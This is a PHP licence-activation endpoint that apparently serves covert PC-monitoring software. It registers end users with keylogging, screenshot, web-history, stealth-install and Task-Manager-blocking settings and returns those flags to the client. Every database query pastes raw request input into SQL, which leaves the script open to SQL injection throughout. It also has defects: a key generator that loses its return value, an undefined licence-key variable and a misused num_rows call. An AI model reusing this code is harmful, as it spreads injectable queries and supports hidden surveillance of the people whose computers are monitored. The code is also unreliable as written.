<?php
include("connection.php");
function generateRandomstring()
{
	$permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyz';
	// Output: 54esmdr0qf
	$string = substr(str_shuffle($permitted_chars), 0, 10);
	// check already license alotted or not
	$checkquery = $conn->query("select * from U_endusers where endlickey='".$string."'");
	if($checkquery->num_rows()>0)
	{
		generateRandomstring();
	}
	else
	{
		return $string;
	}
}
$username="";$pcname="";$mac="";$tracks="";$lickey="";$fullname="";$notes="";$version="";
$username = $_REQUEST["username"];
$pcname = $_REQUEST["pcname"];
$mac = $_REQUEST["mac"];
$tracks = $_REQUEST["tracks"];
$lickey = $_REQUEST["lickey"];
$fullname = $_REQUEST["fullname"];
$notes = $_REQUEST["notes"];
$version = $_REQUEST["version"];
if($lickey!="")
{
	$checkownerlicense = "select * from U_license as ulic INNER JOIN U_endowners as uend ON ulic.owner_id=uend.sno where lickey='".$lickey."' limit 1";
	$col_query = $conn->query($checkownerlicense);
	if($col_query->num_rows>0)
	{
		$fetarrayrow = $col_query->fetch_assoc();
		$currentdate = Date("Y-m-d H:i:s",time());
		$licexpdate = $fetarrayrow['licexp_date'];

		if($fetarrayrow['licexp_date']!="0000-00-00 00:00:00")
		{
			$license_expire_date=strtotime($fetarrayrow['licexp_date']);
			$expirydate = date('Y-m-d H:i:s', strtotime($currentdate. ' + 1 month'));
		}
		else
		{
			$expirydate1="0000-00-00 00:00:00";
		}

		//$license_expire_date = strtotime($fetarrayrow['licexp_date']);

		//$endlickey = generateRandomstring();
		//$expirydate = date('Y-m-d H:i:s', strtotime($currentdate. ' + 1 year'));

		//$fetarrayrow['license_used'].$fetarrayrow['total_lic'];

		if($fetarrayrow['license_used'] < $fetarrayrow['total_lic'])
		{
			if((strtotime(@$currentdate)>$license_expire_date) && (@$expirydate1!="0000-00-00 00:00:00"))
			{
				//echo $license_expire_date."_".$expirydate;
				$ab = "status=600";
			}
			else
			{
				if($fetarrayrow['suspendedlic']!="0")
				{
					$ab= "status=700";
				}
				else
				{
					if($licexpdate=="0000-00-00 00:00:00")
					{
						// update license expiry depends on expiry
						// find the package from packageid
						// the activation date for owner license is current date
						// the expiry date depends upon package purchased
						$activationdate = $currentdate;
						$packageid =  $fetarrayrow['packageid'];
						$packageDet = $conn->query("select * from package where id='".$packageid."'");
						if($packageDet->num_rows>0)
						{
							$packageRow = $packageDet->fetch_assoc();
							$packageduration = $packageRow["packageduration"];
							$packagedurationtype = $packageRow["packagedurationtype"];
							$expirydate = date('Y-m-d H:i:s', strtotime($currentdate.' +'.$packageduration." ".$packagedurationtype));
							$updateLicense = $conn->query("update U_license set licact_date='".$currentdate."', licexp_date='".$expirydate."' where licsno='".$fetarrayrow["licsno"]."'");
						}
					}

					$enduserquery = $conn->query("insert into U_endusers set
						ownerid='".$fetarrayrow['owner_id']."',
						endlickey='".$endlickey."',
						act_date='".$currentdate."',
						expiry_date='".$expirydate."',
						macaddress='".$mac."',
						name='".$fullname."',
						pcname='".$pcname."',
						trackkey='".$tracks."',
						lickey='".$lickey."',
						hint='".$notes."',
						jdt='".Date("Y-m-d H:i:s",time())."',
						version='".$version."',
						keylog='".$fetarrayrow['keylog']."',
						trayicon='".$fetarrayrow['trayicon']."',
						screenshot='".$fetarrayrow['screenshot']."',
						screenshot_interval='".$fetarrayrow['screenshotinterval']."',
						lazyminutes='".$fetarrayrow['lazyminutes']."',
						stealthinstall='".$fetarrayrow['stealthinstall']."',
						webhistory='".$fetarrayrow['webhistory']."',
						taskmanagerblock='".$fetarrayrow['taskmanagerblock']."',
						usbblock='".$fetarrayrow['usbblock']."',
						oauth='".$fetarrayrow['auth']."'");
					$enduserid = $conn->insert_id;

					$oli = $conn->query("update U_license set license_used=license_used+1 where owner_id='".$fetarrayrow['owner_id']."' AND  lickey ='".$lickey."'");
					if($fetarrayrow['stealthinstall']=="1" || $fetarrayrow['stealthinstall']==1)
					{
						$stealthinstall = "true";
					}
					else
					{
						$stealthinstall = "false";
					}
					if($fetarrayrow['usbblock']=="1" || $fetarrayrow['usbblock']==1)
					{
						$usbblock = "true";
					}
					else
					{
						$usbblock = "false";
					}
					if($fetarrayrow['taskmanagerblock']=="1" || $fetarrayrow['taskmanagerblock']==1)
					{
						$taskmanagerblock = "true";
					}
					else
					{
						$taskmanagerblock = "false";
					}
					$ab= "status=500&enduserid=".$enduserid."&ownerid=".$fetarrayrow['owner_id']."&stealthinstall=".$stealthinstall."&lickey=".$lickey."&fullname=".$fullname."&lazyminutes=".$fetarrayrow['lazyminutes']."&usbblock=".$usbblock."&taskmanagerblock=".$taskmanagerblock;
				}
			}
		}
		else
		{
			$ab="status=800";
		}
	}
	else
	{
		$ab="status=900";
	}
}
else
{
	$ab="status=1000";
}
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/plain');
echo $ab;
?>
